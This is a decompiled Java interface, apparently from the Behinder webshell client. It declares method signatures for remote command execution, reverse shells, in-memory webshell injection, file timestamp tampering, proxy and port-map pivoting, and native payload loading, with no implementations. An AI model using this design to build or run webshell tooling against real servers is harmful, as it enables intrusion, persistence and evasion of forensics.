package net.rebeyond.behinder.core;

import java.util.List;
import java.util.Map;
import org.json.JSONObject;

public interface IShellService {
   void setProxy(Map var1);

   Map getProxy(Map var1);

   List getChildList();

   void setChildList(List var1);

   ICrypt getCryptor();

   JSONObject getShellEntity();

   JSONObject getEffectShellEntity();

   boolean doConnect() throws Exception;

   String evalWithTransProtocol(String var1) throws Exception;

   String eval(String var1) throws Exception;

   JSONObject runCmd(String var1, String var2) throws Exception;

   JSONObject createBShell(String var1) throws Exception;

   JSONObject listBShell() throws Exception;

   JSONObject listReverseBShell() throws Exception;

   JSONObject listenBShell(String var1) throws Exception;

   JSONObject closeBShell(String var1, String var2) throws Exception;

   JSONObject stopReverseBShell() throws Exception;

   JSONObject sendBShellCommand(String var1, String var2, String var3) throws Exception;

   JSONObject submitPluginTask(String var1, String var2, Map var3) throws Exception;

   JSONObject execPluginTask(String var1, String var2, Map var3) throws Exception;

   JSONObject getPluginTaskResult(String var1) throws Exception;

   JSONObject stopPluginTask(String var1) throws Exception;

   JSONObject loadJar(String var1) throws Exception;

   JSONObject createRealCMD(String var1) throws Exception;

   JSONObject stopRealCMD() throws Exception;

   JSONObject readRealCMD() throws Exception;

   JSONObject writeRealCMD(String var1) throws Exception;

   JSONObject listFiles(String var1) throws Exception;

   JSONObject checkFileHash(String var1, String var2) throws Exception;

   JSONObject getTimeStamp(String var1) throws Exception;

   JSONObject updateTimeStamp(String var1, String var2, String var3, String var4) throws Exception;

   JSONObject updateModifyTimeStamp(String var1, String var2) throws Exception;

   JSONObject compress(String var1) throws Exception;

   JSONObject deleteFile(String var1) throws Exception;

   JSONObject showFile(String var1, String var2) throws Exception;

   JSONObject checkFileExist(String var1) throws Exception;

   JSONObject renameFile(String var1, String var2) throws Exception;

   JSONObject createFile(String var1) throws Exception;

   JSONObject createDirectory(String var1) throws Exception;

   void downloadFile(String var1, String var2) throws Exception;

   JSONObject downFilePart(String var1, long var2, long var4) throws Exception;

   JSONObject execSQL(String var1, String var2, String var3, String var4, String var5, String var6, String var7) throws Exception;

   JSONObject uploadFile(String var1, byte[] var2, boolean var3) throws Exception;

   JSONObject uploadFile(String var1, byte[] var2) throws Exception;

   JSONObject appendFile(String var1, byte[] var2) throws Exception;

   JSONObject uploadFilePart(String var1, byte[] var2, long var3, long var5) throws Exception;

   boolean checkClassExist(String var1) throws Exception;

   JSONObject createRemotePortMap(String var1, String var2, String var3, String var4) throws Exception;

   JSONObject createRemoteSocks(String var1, String var2, String var3, String var4) throws Exception;

   JSONObject createVPSSocks(String var1, String var2) throws Exception;

   JSONObject stopVPSSocks() throws Exception;

   JSONObject createPortMap(String var1, String var2, String var3) throws Exception;

   JSONObject readPortMapData(String var1, String var2, String var3) throws Exception;

   JSONObject writePortMapData(byte[] var1, String var2, String var3, String var4) throws Exception;

   JSONObject closeLocalPortMap(String var1, String var2) throws Exception;

   boolean closeLocalPortMapWorker(String var1) throws Exception;

   boolean closeRemotePortMap() throws Exception;

   JSONObject readProxyData(String var1) throws Exception;

   JSONObject writeProxyData(byte[] var1, String var2) throws Exception;

   JSONObject clearProxy() throws Exception;

   JSONObject closeProxy(String var1) throws Exception;

   JSONObject openProxy(String var1, String var2, String var3) throws Exception;

   JSONObject openProxyAsyc(String var1, String var2, String var3) throws Exception;

   JSONObject echo(String var1) throws Exception;

   JSONObject getBasicInfo(String var1) throws Exception;

   void keepAlive() throws Exception;

   JSONObject connectBack(String var1, String var2, String var3) throws Exception;

   JSONObject loadNativeLibrary(String var1) throws Exception;

   JSONObject executePayload(String var1, String var2) throws Exception;

   JSONObject loadLibraryAndexecutePayload(String var1, String var2) throws Exception;

   JSONObject loadLibraryAndfreeFile(String var1, String var2) throws Exception;

   JSONObject freeFile(String var1, String var2) throws Exception;

   JSONObject loadLibraryAndAntiAgent(String var1) throws Exception;

   JSONObject antiAgent(String var1) throws Exception;

   JSONObject loadLibraryAndtest() throws Exception;

   JSONObject getMemShellTargetClass() throws Exception;

   JSONObject injectAgentNoFileMemShell(String var1, String var2, boolean var3) throws Exception;

   JSONObject injectAgentMemShell(String var1, String var2, String var3, boolean var4) throws Exception;

   JSONObject createReversePortMap(String var1) throws Exception;

   JSONObject readReversePortMapData(String var1) throws Exception;

   boolean writeReversePortMapData(byte[] var1, String var2) throws Exception;

   JSONObject listReversePortMap() throws Exception;

   JSONObject stopReversePortMap(String var1) throws Exception;

   JSONObject closeReversePortMap(String var1) throws Exception;

   byte[] warpTransferPayload(byte[] var1, String var2, String var3, String var4, String var5, String var6) throws Exception;

   Map transferPayload(byte[] var1) throws Exception;

   JSONObject doProxy(String var1, String var2, String var3) throws Exception;

   void setCompareMode(int var1);
}
